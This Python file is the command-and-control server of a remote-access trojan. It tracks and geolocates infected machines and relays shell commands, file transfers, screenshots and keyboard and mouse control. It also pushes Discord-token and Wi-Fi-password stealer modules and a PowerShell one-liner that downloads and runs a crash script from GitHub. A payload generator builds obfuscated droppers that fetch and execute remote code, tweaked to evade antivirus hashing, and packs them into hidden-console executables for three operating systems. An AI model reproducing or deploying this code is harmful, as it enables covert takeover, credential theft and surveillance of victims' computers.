import json
import os
import subprocess
import platform
import base64
import zlib
import marshal
import uuid
import shutil
import datetime
import itertools
import time
import geocoder
import ipaddress


class C2:
    def __init__(self, sio):
        self.sio = sio
        self.devices = {}
        self.total_devices = {}
        with open("clients.json", "r") as f:
            self.total_devices = json.load(f)
        for device in self.total_devices:
            self.total_devices[device]["status"] = "Offline"
        self.sio.on("mConnect", self.on_connect)
        self.sio.on("disconnect", self.on_disconect)
        self.sio.on("command", self.send_command)
        self.sio.on("result", self.get_result)
        self.sio.on("download_file_return", self.save_file)
        self.sio.on("screen_status", self.screen_status)
        self.sio.on("screenshot", self.screenshot_taken)
        self.sio.on("switch_screen", self.switch_screen)
        self.sio.on("screen_count", self.screen_count)
        self.sio.on("change_screen_number", self.change_screen_number)

        self.sio.on("mouse_input", self.mouse_input)
        self.sio.on("keyboard_input", self.keyboard_input)
        self.sio.on("lock_keyboard", self.lock_keyboard)
        self.sio.on("lock_mouse", self.lock_mouse)

        self.sio.on("mouse_click", self.mouse_click)
        self.sio.on("mouse_click_right", self.mouse_click_right)
        self.sio.on("mouse_scroll", self.mouse_scroll)
        self.sio.on("key_press", self.key_press)
        self.sio.on("key_press_short", self.key_press_short)

        print(f"Current time: {datetime.datetime.utcnow()}")

    def get_client_ip(self, environ):
        header_priority = [
            "HTTP_X_FORWARDED_FOR",
            "HTTP_X_REAL_IP",
            "HTTP_X_FORWARDED",
            "HTTP_X_CLUSTER_CLIENT_IP",
            "HTTP_FORWARDED_FOR",
            "HTTP_FORWARDED",
            "HTTP_CLIENT_IP",
            "REMOTE_ADDR",
        ]

        for header in header_priority:
            if header in environ:
                ip_list = environ[header].split(",")
                for ip in reversed(ip_list):
                    ip = ip.strip()
                    try:
                        ip_obj = ipaddress.ip_address(ip)
                        if not ip_obj.is_private:
                            print(f"Found public IP in {header}: {ip}")
                            return ip
                    except ValueError:
                        continue

        # If no public IP is found, return the first IP from X-Forwarded-For or None
        return environ.get("HTTP_X_FORWARDED_FOR", "").split(",")[0].strip() or None

    def on_connect(self, sid, data):
        print(f"New device connected with sid {sid}")

        environ = self.sio.get_environ(sid)
        if not environ:
            print("Error: Could not retrieve environment details for this connection")
            return

        client_ip = self.get_client_ip(environ)

        print(f"IP: {client_ip}")

        try:
            geo = geocoder.ip(client_ip)
            print(geo)
            geolocation = {
                "latitude": geo.latlng[0],
                "longitude": geo.latlng[1],
                "address": geo.address,
            }
        except:
            geolocation = {
                "latitude": "Unknown",
                "longitude": "Unknown",
                "address": "Unknown",
            }

        data["public_ip"] = client_ip
        data["geolocation"] = geolocation

        if data["uid"] not in self.devices:
            data["sid"] = sid
            self.devices.update({data["uid"]: data})
            self.total_devices.update({data["uid"]: data})
        else:
            self.sio.emit("kill", {"uid": data["uid"]}, to=data["sid"])

        self.update_json()

    def on_disconect(self, sid):
        print(f"Device disconnected with sid {sid}")
        for device in self.devices:
            if sid == self.devices[device]["sid"]:
                self.devices.pop(device)
                break
        self.update_json()

    def list_devices(self):
        return self.devices

    def delete_device(self, device_id):
        try:
            self.total_devices.pop(device_id)
            if device_id in self.devices:
                self.devices.pop(device_id)
                self.sio.emit("delete", {'uid': device_id}, to=self.devices[device_id]["sid"])
                return (True, "")
        except Exception as err:
            return (False, err)

        self.update_json()

    def list_all_devices(self):
        try:
            return (True, self.total_devices)  # Success case
        except Exception as err:
            return (False, str(err))

    def send_command(self, sid, data):
        self.sio.emit("command", {"uid": data["uid"], "cmd": data["cmd"]})

    def get_result(self, sid, data):
        for device in self.devices:
            if self.devices[device]["sid"] == sid:
                self.sio.emit("result", {"uid": device, "result": data})
                break

    def ctrl(self, data):
        self.sio.emit("restart", data)

    def update_json(self):
        for device in self.total_devices:
            if device not in self.devices:
                self.total_devices[device]["status"] = "Offline"
            else:
                self.total_devices[device]["status"] = "Online"

        with open("clients.json", "w") as f:
            json.dump(self.total_devices, f)

    def parce_ip(self, ip_range):
        ip_addresses = []

        if "-" in ip_range:
            sections = ip_range.split(".")

            # For each section, handle the range if it exists
            parsed_sections = []
            for section in sections:
                if "-" in section:
                    start, end = map(int, section.split("-"))
                    parsed_sections.append(range(start, end + 1))
                else:
                    parsed_sections.append([int(section)])

            # Generate all combinations of the sections
            all_ips = list(itertools.product(*parsed_sections))

            # Convert the combinations to IP address strings
            ip_addresses = [".".join(map(str, ip)) for ip in all_ips]

        else:
            ip_addresses.append(ip_range)

        return ip_addresses

    def explotation_module(self, data):
        print(data)
        explotation_module_type = data["explotation_module"]
        uids = data["uids"]

        if explotation_module_type == "bsod":
            command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
            for uid in uids:
                self.sio.emit("command", {"uid": uid, "cmd": command})

        if explotation_module_type == "discord":
            for uid in uids:
                self.sio.emit("pem", {"uid": uid, "url": "client/pem/discord.py"})

        if explotation_module_type == "wifi-password":
            for uid in uids:
                self.sio.emit("pem", {"uid": uid, "url": "client/pem/wifi.py"})

        if explotation_module_type == "send-command":
            for uid in uids:
                print(data["input"])
                self.sio.emit("command", {"uid": uid, "cmd": data["input"]})

        if explotation_module_type == "restart":
            for uid in uids:
                self.sio.emit("restart", uid)

    def generate(self, generate):
        os_name = generate["os"]
        arch = generate["arch"]
        url = generate["ip"]

        if not os.path.isdir("payloads"):
            os.makedirs("payloads")

        date = datetime.datetime.utcnow().strftime("%Y-%m-%d-%H-%M-%S")
        payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"

        requ_numpy="1.24.4"

        if os_name == "Windows":
            requ_numpy = "2.2.1"

        with open('requirements.txt', 'w') as f:
            f.writelines("""
requests==2.31.0
python-socketio==5.11.0
urllib3<2.0
websocket-client==1.6.1
chardet==5.2.0
mss==9.0.2
Pillow==10.4.0
numpy=="""+requ_numpy+"""
PyAutoGUI
opencv-python-headless""")

        payload = f"""url = "{url}"
file_path = "{payload_file_name}"
def create_moduel(url):
  code = urlopen(url).read().decode('utf-8')
  spec = importlib.util.spec_from_loader('temp', loader=None)
  module = importlib.util.module_from_spec(spec)

  # execute the code in the temporary module
  exec(code, module.__dict__)

  return module
create_moduel(url+"client/client.py").run(url, file_path)"""

        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2,os
from PIL import Image
from urllib.request import urlopen

try:
    import pyautogui
except Exception as e:
    print(e)
ssl._create_default_https_context = ssl._create_stdlib_context
exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
#{uuid.uuid4()}"""
        # this will prevent anti-viruses from looking for hashes of the script

        with open(f"{payload_file_name}.py", "w") as f:
            f.writelines(dropper)

        if not os.path.isdir("payloads"):
            os.makedirs("payloads")

        try:
            if os_name == "Windows":
                result = subprocess.run(
                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                    shell=True,
                    capture_output=True,
                )
                print(
                    result.stdout.decode(), result.stderr.decode()
                )  # Print output for debugging
                shutil.copy(
                    f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe"
                )

            elif os_name == "Linux":
                result = subprocess.run(
                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
                    shell=True,
                    capture_output=True,
                )
                print(
                    result.stdout.decode(), result.stderr.decode()
                )  # Print output for debugging
                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")

            elif os_name == "OSX":
                result = subprocess.run(
                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pyautogui --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
                    shell=True,
                    capture_output=True,
                )
                print(
                    result.stdout.decode(), result.stderr.decode()
                )  # Print output for debugging
                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")

            os.remove(f"{payload_file_name}.py")
            os.remove(f"{payload_file_name}.spec")
        
        except Exception as e:
            print(e)
            os.remove(f"{payload_file_name}.py")
            os.remove(f"{payload_file_name}.spec")


    # File uploads is working again full

    def upload_file(self, request):
        file = request.files["file"]
        uids = json.loads(request.form["uids"])

        if file.filename == "":
            return json.dumps({"error": "No selected file"}), 400

        if file:
            # Read the file and convert to base64
            file_content = file.read()
            base64_encoded = zlib.compress(base64.b64encode(file_content), level=9)

            print("file encoded")

        for uid in uids:
            self.sio.emit(
                "upload_file",
                {"uid": uid, "file_name": file.filename, "file": base64_encoded},
                to=self.devices[uid]["sid"]
            )

    def download_file(self, data):
        print(data)
        file_path = data["file_path"]

        for uid in data["uids"]:
            self.sio.emit("download_file", {"uid": uid, "file_path": file_path})

    def save_file(self, sid, data):
        if not os.path.isdir("files_saved"):
            os.makedirs("files_saved")

        date_format = "%Y-%m-%d-%H-%M-%S"
        file_name = data['file_name'].split("/")[-1] #FUCK U THIS IS LINUX IF U HAVE A / IN YOU FILE NAME, CRY ABOUT IT
        with open(
            f"files_saved/{data['uid']}_{datetime.datetime.now().strftime(date_format)}_{file_name}",
            "wb",
        ) as f:
            f.write(base64.b64decode(zlib.decompress(data["file"])))

    def get_settings(self):
        try:
            with open("config.json", "r") as file:
                credentials = json.load(file)
            return credentials
        except FileNotFoundError:
            return None

    def screen_status(self, sid, data):
        print(data)
        settings = self.get_settings()
        screen_res_data = {
            'uid': data['uid'],
            'screen_fps': settings['settings']['screen_sharing']['screen_fps'],
            'screen_qualtiy': settings['settings']['screen_sharing']['screen_qualtiy']
        }
        self.sio.emit("change_screen_information", screen_res_data)
        self.sio.emit("screen_status", data)

    def screenshot_taken(self, sid, data):
        print(sid)
        self.sio.emit("screenshot", data)

    def switch_screen(self, sid, data):
        self.sio.emit("switch_screen", data)



    def mouse_input(self, sid ,data):
        self.sio.emit("mouse_input", data)

    def keyboard_input(self, sid ,data):
        self.sio.emit("keyboard_input", data)

    def lock_keyboard(self, sid ,data):
        self.sio.emit("lock_keyboard", data)

    def lock_mouse(self, sid ,data):
        self.sio.emit("lock_mouse", data)


    def mouse_click(self, sid, data):
        self.sio.emit("mouse_click", data)

    def mouse_click_right(self, sid, data):
        self.sio.emit("mouse_click_right", data)

    def screen_count(self, sid, data):
        self.sio.emit("screen_count", data)

    def change_screen_number(self, sid, data):
        self.sio.emit("change_screen_number", data)
    
    def mouse_scroll(self, sid, data):
        self.sio.emit("mouse_scroll", data)

    def key_press(self, sid, data):
        self.sio.emit("key_press", data)

    def key_press_short(self, sid, data):
        self.sio.emit("key_press_short", data)
